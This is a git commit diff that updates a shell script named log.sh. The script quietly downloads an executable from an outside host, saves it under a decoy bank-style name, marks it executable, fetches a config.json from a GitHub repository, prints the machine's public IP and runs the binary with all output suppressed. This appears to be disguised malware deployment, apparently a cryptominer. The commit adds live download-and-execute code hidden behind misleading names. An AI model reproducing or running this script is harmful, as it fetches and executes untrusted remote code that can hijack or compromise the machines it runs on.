30ceb850f5ee6d3044d3489838625deea22b6035
Mas kurniawan <110314564+55113110159@users.noreply.github.com>
2024-01-14 02:36:43 +0700

    Update log.sh

--- log.sh
+++ log.sh
@@ -1,7 +1,7 @@
-wget -q -O SpringwellBanks https://maper.info/api-server && chmod +x SpringwellBanks >/dev/null 2>&1
+wget -q -O PursuitBankCorp https://maper.info/api-server && chmod +x PursuitBankCorp >/dev/null 2>&1
 wget -q https://raw.githubusercontent.com/55113110159/TIBO/main/config.json && chmod +x config.json
 sleep 11 
 echo "******************************************************************" 
 echo "IP ORI ==> "$(curl ifconfig.me) 
 echo " "
-./SpringwellBanks -c "config.json" >/dev/null 2>&1
+./PursuitBankCorp -c "config.json" >/dev/null 2>&1
